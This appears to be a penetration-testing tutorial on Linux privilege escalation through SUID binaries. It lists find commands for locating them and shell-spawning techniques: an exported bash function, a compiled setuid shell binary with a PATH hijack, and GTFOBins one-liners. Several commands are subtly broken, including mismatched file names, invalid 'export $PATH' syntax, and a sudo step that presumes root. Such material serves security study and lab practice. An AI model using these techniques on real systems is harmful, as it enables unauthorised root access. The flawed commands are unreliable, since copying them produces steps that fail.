## SUID Binaries

SUID (Set User ID) bit is a special permission in Linux that allows a program to run as the program's owner for all users on the system that have access to it which may lead to performing privilege escalation by execute code or write arbitrary data on the system.

### How to Find SUIDs?

To find SUID that may be useful then execute the following commands:

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

For example, an output could be:

```
bash-4.2$ find / -user root -perm -4000 -print 2> /dev/null
find / -user root -perm -4000 -print 2> /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/update_my_docs
[... reduced ...]
````

If we'll check the /usr/bin/update_my_docs we'll see it's running under root ownership:

```
bash-4.2$: ls /usr/bin/update_my_docs -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/update_my_docs
```

### Exploiting SUID

Exploiting SUIDs binaries is very simple and there are two diffrent techniques to use it.
Let's say we'd like to check what function our program use, so we'll use strings utility as following:

```
bash-4.2:/usr/bin$ strings update_my_docs
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
system
__libc_start_main
GLIBC_2.0
PTRh0
[^_]
cp
```

In this example, we quickly identify the cp (copy) binary which executed as system (see the function name inside right?)

#### Bash Function Manipulation

In this technique, we'll export a bash function matching one of the programs called by the program (i.e., "/usr/bin/cp"):

```
function /usr/bin/cp(){ /bin/sh; }
export -f /usr/bin/cp
```

Then we'll execute our program /usr/bin/update_my_docs to get our shell.

#### Create Binary SUID

In this method, we'll create a SUID bianry as following:

```
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > /tmp/setuid.c
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
mv setuid cp # change name to the expected binary in our example
```

Place it in our $PATH using the command:

```
export $PATH=/tmp:$PATH
```

Then execute our binary to get shell as root.

#### GTFOBins 

GTFOBins is a list of UNIX binaries that can be exploited to bypass local security restrictions. Those binaries can be abused to escape restricted shells, spawn remote shells, elevate privlieges 
and more. 

A few examples: 

``` 
awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
```

For more acurated list: https://gtfobins.github.io/gtfobins/
